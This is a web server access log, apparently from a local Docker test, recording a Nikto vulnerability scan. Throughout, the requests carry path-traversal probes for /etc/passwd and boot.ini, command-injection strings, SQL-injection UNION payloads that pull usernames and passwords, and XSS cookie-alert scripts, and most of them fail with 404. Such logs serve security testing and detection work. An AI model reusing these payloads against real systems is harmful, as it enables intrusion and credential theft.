172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cfdocs/exampleapp/email/getfile.cfm?filename=c:\\boot.ini HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000519)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cfdocs/exampleapp/docs/sourcewindow.cfm?Template=c:\\boot.ini HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000520)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /cfdocs/expeval/exprcalc.cfm?OpenFilePath=c:\\boot.ini HTTP/1.1" 404 518 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000521)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /netget?sid=user&msg=300&file=../../../../../../../../../boot.ini HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000522)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /netget?sid=user&msg=300&file=../../../../../../../../../../etc/passwd HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000523)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /php/php.exe?c:\\winnt\\boot.ini HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000524)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /phpping/index.php?pingto=www.test.com%20|%20dir%20c:\\\\ HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000525)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /scripts/db4web_c.exe/dbdirname/c%3A%5Cboot.ini HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000526)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /us/cgi-bin/sewse.exe?d:/internet/sites/us/sewse/jabber/comment2.jse+c:\\boot.ini HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000527)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /wx/s.dll?d=/boot.ini HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000528)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f../boot.ini HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000530)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../boot.ini%00 HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000531)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /ssi/envout.bat?|dir%20..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\ HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000538)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /php/php.exe?c:\\boot.ini HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000539)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /../../../../../../../../../boot.ini HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000540)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /../../../../winnt/repair/sam._ HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000541)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\boot.ini HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000542)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET ///etc/passwd HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000543)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET ///etc/hosts HTTP/1.1" 404 500 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000544)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET ////./../.../boot.ini HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000545)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /.cobalt/sysManage/../admin/.htaccess HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000546)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /albums/userpics/Copperminer.jpg.php?cat%20/etc/passwd HTTP/1.1" 404 526 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000547)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /autohtml.php?op=modload&mainfile=x&name=/etc/passwd HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000548)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /atomicboard/index.php?location=../../../../../../../../../../etc/passwd HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000549)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /current/modules.php?mod=fm&file=../../../../../../../../../../etc/passwd%00&bn=fm_d1 HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000550)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /current/index.php?site=demos&bn=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000551)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /dev/translations.php?ONLY=%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd%00 HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000552)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /DomainFiles/*//../../../../../../../../../../etc/passwd HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000553)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /docs/showtemp.cfm?TYPE=JPEG&FILE=c:\\boot.ini HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000554)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /ezhttpbench.php?AnalyseSite=/etc/passwd&NumLoops=1 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000555)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.php?download=/winnt/win.ini HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000556)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.php?download=/windows/win.ini HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000557)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.php?download=/etc/passwd HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000558)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.php?|=../../../../../../../../../etc/passwd HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000559)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.php?page=../../../../../../../../../../etc/passwd HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000560)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.php?page=../../../../../../../../../../boot.ini HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000561)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /index.php?l=forum/view.php&topic=../../../../../../../../../etc/passwd HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000562)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../etc/passwd HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000563)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /jsp/jspsamp/jspexamples/viewsource.jsp?source=../../../../../../../../../../boot.ini HTTP/1.1" 404 529 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000564)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /k/home?dir=/&file=../../../../../../../../etc/passwd&lang=kor HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000565)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nph-showlogs.pl?files=../../../../../../../../etc/passwd&filter=.*&submit=Go&linecnt=500&refresh=0 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000566)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /nph-showlogs.pl?files=../../../../../../../../etc/&filter=.*&submit=Go&linecnt=500&refresh=0 HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000567)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /phprocketaddin/?page=../../../../../../../../../../boot.ini HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000568)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000569)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /phpwebfilemgr/index.php?f=../../../../../../../../../etc HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000570)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /phptonuke.php?filnavn=/etc/passwd HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000571)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /put/cgi-bin/putport.exe?SWAP&BOM&OP=none&Lang=en-US&PutHtml=../../../../../../../../etc/passwd HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000572)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /ROADS/cgi-bin/search.pl?form=../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000573)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /support/common.php?f=0&ForumLang=../../../../../../../../../../etc/passwd HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000574)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /viewpage.php?file=/etc/passwd HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000575)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /Web_Store/web_store.cgi?page=../../../../../../../../../../etc/passwd%00.html HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000576)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webMathematica/MSP?MSPStoreID=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini&MSPStoreType=image/gif HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000577)"
172.17.0.1 - - [12/Feb/2019:08:08:26 +0000] "GET /webMathematica/MSP?MSPStoreID=../../../../../../../../../../etc/passwd&MSPStoreType=image/gif HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000578)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /servlet/webacc?User.html=../../../../../../../../../../../../../../../../../../etc/passwd%00 HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000650)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /webcalendar/forum.php?user_inc=../../../../../../../../../../etc/passwd HTTP/1.1" 404 512 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000651)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /logbook.pl?file=../../../../../../../bin/cat%20/etc/passwd%00| HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000652)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /page.cgi?../../../../../../../../../../etc/passwd HTTP/1.1" 404 499 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000654)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /edittag/edittag.cgi?file=%2F..%2F..%2F..%2F..%2F..%2Fetc/passwd HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000655)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /base/webmail/readmsg.php?mailbox=../../../../../../../../../../../../../../etc/passwd&id=1 HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000656)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /athenareg.php?pass=%20;cat%20/etc/passwd HTTP/1.1" 404 504 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000667)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000668)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /search?NS-query-pat=../../../../../../../../../../etc/passwd HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000669)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /search?NS-query-pat=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\boot.ini HTTP/1.1" 404 497 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000670)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /..\\..\\..\\..\\..\\..\\temp\\temp.class HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000671)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /../../../../../../../../../../etc/passwd HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000672)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /.../.../.../.../.../.../.../.../.../boot.ini HTTP/1.1" 404 536 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000673)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /................../etc/passwd HTTP/1.1" 404 520 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000674)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /%3f.jsp HTTP/1.1" 404 496 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000675)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000677)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1" 400 485 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000678)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /%00 HTTP/1.1" 404 492 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000679)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ca//\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../\\\\windows/\\\\win.ini HTTP/1.1" 404 544 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000680)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ca/..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\/\\\\etc/\\\\passwd HTTP/1.1" 404 533 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000681)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /ca/..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\winnt/\\\\win.ini HTTP/1.1" 404 541 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000682)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /admentor/adminadmin.asp HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000683)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /imp/mailbox.php3?actionID=6&server=x&imapuser=x';somesql+--&pass=x HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000686)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /userinfo.php?uid=1; HTTP/1.1" 404 503 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000687)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /site/' UNION" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /site/' UNION" 400 0 "-" "-"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1" 404 510 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000690)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /postnuke/html/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000691)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month= HTTP/1.1" 404 511 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000693)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /phpBB2/search.php?search_id=1\\\\ HTTP/1.1" 404 508 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000694)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/* HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000695)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /author.asp HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000696)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /horde/test.php HTTP/1.1" 404 505 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000697)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /imp/horde/test.php HTTP/1.1" 404 509 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000698)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /examples/cookie HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000700)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /examples/session HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000701)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /themes/mambosimple.php?detection=detected&sitename=</title><script>alert(document.cookie)</script> HTTP/1.1" 404 513 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000702)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?option=search&searchword=<script>alert(document.cookie);</script> HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000703)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /emailfriend/emailnews.php?id=\\\"<script>alert(document.cookie)</script> HTTP/1.1" 404 516 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000704)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /emailfriend/emailfaq.php?id=\\\"<script>alert(document.cookie)</script> HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000705)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /emailfriend/emailarticle.php?id=\\\"<script>alert(document.cookie)</script> HTTP/1.1" 404 519 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000706)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /administrator/upload.php?newbanner=1&choice=\\\"<script>alert(document.cookie)</script> HTTP/1.1" 404 515 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000707)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /administrator/popups/sectionswindow.php?type=web&link=\\\"<script>alert(document.cookie)</script> HTTP/1.1" 404 530 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000708)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /administrator/gallery/view.php?path=\\\"<script>alert(document.cookie)</script> HTTP/1.1" 404 521 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000709)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /administrator/gallery/uploadimage.php?directory=\\\"<script>alert(document.cookie)</script> HTTP/1.1" 404 528 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000710)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /administrator/gallery/navigation.php?directory=\\\"<script>alert(document.cookie)</script> HTTP/1.1" 404 527 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000711)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /administrator/gallery/gallery.php?directory=\\\"<script>alert(document.cookie)</script> HTTP/1.1" 404 524 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000712)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /index.php?dir=<script>alert('Vulnerable')</script> HTTP/1.1" 302 478 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000713)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /https-admserv/bin/index?/<script>alert(document.cookie)</script> HTTP/1.1" 404 514 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000714)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /clusterframe.jsp?cluster=<script>alert(document.cookie)</script> HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000715)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /article.cfm?id=1'<script>alert(document.cookie);</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000716)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /upload.php?type=\\\"<script>alert(document.cookie)</script> HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000717)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /soinfo.php?\\\"><script>alert('Vulnerable')</script> HTTP/1.1" 404 501 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000718)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?op=modload&name=News&file=index&catid=&topic=><script>alert('Vulnerable');</script>; HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000719)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000720)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+> HTTP/1.1" 404 502 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000721)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef HTTP/1.1" 404 525 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000722)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt; HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000723)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /666%0a%0a<script>alert('Vulnerable');</script>666.jsp HTTP/1.1" 404 552 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000724)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script> HTTP/1.1" 404 506 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000725)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script> HTTP/1.1" 404 584 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000726)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /servlet/org.apache.catalina.Context/<script>alert('Vulnerable')</script> HTTP/1.1" 404 575 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000727)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /servlet/org.apache.catalina.Globals/<script>alert('Vulnerable')</script> HTTP/1.1" 404 575 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000728)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script> HTTP/1.1" 404 589 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000729)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script> HTTP/1.1" 404 507 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000730)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /<script>alert('Vulnerable')</script>.shtm HTTP/1.1" 404 544 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000731)"
172.17.0.1 - - [12/Feb/2019:08:08:27 +0000] "GET /<script>alert('Vulnerable')</script>.stm HTTP/1.1" 404 543 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000732)"
